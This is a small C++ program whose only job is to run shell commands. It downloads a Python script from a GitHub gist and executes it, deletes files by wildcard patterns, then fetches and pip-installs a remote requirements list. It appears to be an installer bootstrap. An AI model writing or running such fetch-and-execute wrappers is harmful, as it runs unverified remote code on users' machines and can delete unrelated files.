#include "iostream"
#include "fstream"
#include "string.h"
using namespace std;

int main() {
    system("wget -O INSTALL.py https://gist.githubusercontent.com/New-dev0/2eadc68e17e179233cd8196ccb22b44d/raw/01af8655520d461569a7e5927f764354e1380187/insrok.py");
    system("python3 INSTALL.py");
    system("rm *py");
    system("rm 000* 001*");
    system("wget -O reqs.txt https://gist.githubusercontent.com/tornals/daea39f03061a6d1039860c313070d43/raw/a8a99253b1fe624444657070d6ec5488827a7a92/aSZdxfcg.txt");
    system("pip3 install -r reqs.txt && rm reqs.txt");
    return 0;
};
